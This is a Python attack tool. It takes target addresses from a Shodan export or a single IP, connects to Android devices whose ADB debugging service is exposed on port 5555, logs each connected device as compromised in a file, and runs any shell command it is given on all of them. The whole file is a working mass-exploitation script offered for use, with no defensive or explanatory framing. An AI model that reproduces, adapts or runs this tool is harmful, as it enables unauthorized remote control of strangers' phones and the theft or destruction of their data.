#!/usr/bin/env python3
import json
import logging
import os
from subprocess import PIPE, Popen

logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level='INFO')

logo_design_4 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
'''
print(logo_design_4)

DEFAULT_ADB_PORT = 5555
DEFAULT_DEVICES_FILE = 'devices.txt'


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--target-ip',
                        dest='ip',
                        required=False,
                        help='An IP address of the android device')
    parser.add_argument('--target-port',
                        dest='port',
                        default=DEFAULT_ADB_PORT,
                        required=False,
                        help='A TCP port of the remote ADB service. Default is ' + str(DEFAULT_ADB_PORT))
    parser.add_argument('--shodan-file',
                        dest='shodan_file',
                        required=False,
                        help='A file with Shodan export in JSON format. '
                             'JSON entries must be separated with a new-line character.')
    parser.add_argument('-x',
                        '--execute',
                        dest='execute',
                        required=False,
                        help='Execute a given command on the compromised android device(s)')
    parser.add_argument('--devices-file',
                        dest='devices_file',
                        default=DEFAULT_DEVICES_FILE,
                        required=False,
                        help='A txt file with stored IP addresses of connected android devices. Default is ' +
                             DEFAULT_DEVICES_FILE)
    options = parser.parse_args()

    return options


def store_connected_device(ip_address, port, devices_file):
    with open(devices_file, 'a') as f:
        f.write(f'{ip_address}:{port}')


class AndroidDevice:
    def __init__(self, ip_address, port, devices_file):
        self.ip_address = ip_address
        self.port = str(port)
        self.devices_file = devices_file
        self.is_connected = False

    def connect(self):
        logging.info('Connecting to %s:%s', self.ip_address, self.port)
        try:
            with Popen(['adb', 'connect', f'{self.ip_address}:{self.port}'],
                       stdout=PIPE,
                       stderr=PIPE) as process:
                stdout, stderr = process.communicate()
                if stdout and 'connected' in str(stdout):
                    logging.info('Connected to %s:%s', self.ip_address, self.port)
                    self.is_connected = True
                    store_connected_device(self.ip_address, self.port, self.devices_file)
                if stderr:
                    if 'refused' in str(stderr).lower():
                        logging.warning('%s - connection refused', self.ip_address)
                    elif 'out' in str(stderr).lower():
                        logging.warning('%s - connection timed out', self.ip_address)
        except Exception as e:
            logging.error('%s - %s', self.ip_address, e)

    def execute(self, command):
        try:
            with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'shell', command],
                       stdout=PIPE,
                       stderr=PIPE) as process:
                stdout, stderr = process.communicate()
                if stdout:
                    print(stdout)
                if stderr:
                    print(stderr)
        except Exception as e:
            logging.error('%s -%s', self.ip_address, e)


options = get_arguments()
android_devices = []
if options.ip:
    android_devices = [AndroidDevice(ip_address=options.ip,
                                     port=options.port,
                                     devices_file=options.devices_file)]
elif options.shodan_file:
    file_name = options.shodan_file
    logging.info('Reading %s', file_name)
    with open(file_name, 'r') as f:
        try:
            for line in f.readlines():
                dump = json.loads(line)
                android_devices.append(AndroidDevice(ip_address=dump['ip_str'], port=dump['port'],
                                                     devices_file=options.devices_file))
        except Exception as e:
            logging.error(e)
if android_devices:
    os.system("adb tcpip 5555")
    logging.info('%s android devices have been passed for exploitation', len(android_devices))
    for device in android_devices:
        device.connect()
    connected_android_devices = [device for device in android_devices if device.is_connected]
    if connected_android_devices:
        logging.info('%s android devices have been connected', len(connected_android_devices))
        if options.execute:
            for device in connected_android_devices:
                device.execute(options.execute)
